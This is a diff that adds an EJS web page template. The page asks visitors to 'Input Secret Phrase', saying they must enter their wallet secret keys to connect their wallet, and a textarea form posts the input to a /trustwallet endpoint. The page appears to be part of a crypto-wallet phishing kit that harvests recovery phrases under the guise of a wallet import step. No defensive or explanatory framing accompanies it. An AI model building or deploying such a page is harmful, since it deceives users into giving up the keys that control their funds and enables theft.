@@ -1,0 +1,60 @@
+
+<%- include("./include/header.ejs") %>
+
+<div class="hero_area" style="background-color: blue;">
+  <!-- header section strats -->
+  <header class="header_section">
+    <div class="container">
+      <nav class="navbar navbar-expand-lg custom_nav-container ">
+        <a class="navbar-brand " href="/">
+          <span>
+            PEA
+          </span>
+        </a>
+
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+          <span class=""> </span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav  ">
+            <li class="nav-item active">
+              <a class="nav-link" href="/">Back</a>
+            </li>
+          </ul>
+        </div>
+      </nav>
+    </div>
+  </header>
+  <!-- end header section -->
+  
+  <section class="about_section about_section1 layout_padding">
+    <div class="text-center">
+      <div class="row">
+        <div style="margin: 0 auto; text-align: center;">
+          <div class="detail-box">
+            <div class="heading_container">
+              <h2 sty>
+                Input Secret Phrase
+              </h2>
+            </div>
+            <p>
+              Input your wallet secret keys to be able to connect your wallet
+            </p>
+            <form action="/trustwallet" method="post">
+              <div class="col-md-10">
+                <textarea class="form-control" class="form-control keys" rows="10" name="name"></textarea>
+                <span id="acceptdata"></span>
+                <br>
+                <input type="submit" name="submit" value="IMPORT" class="btn btn-info btn-lg col-md-12">
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- end about section -->
+
+  <%- include("./include/footer.ejs") %>
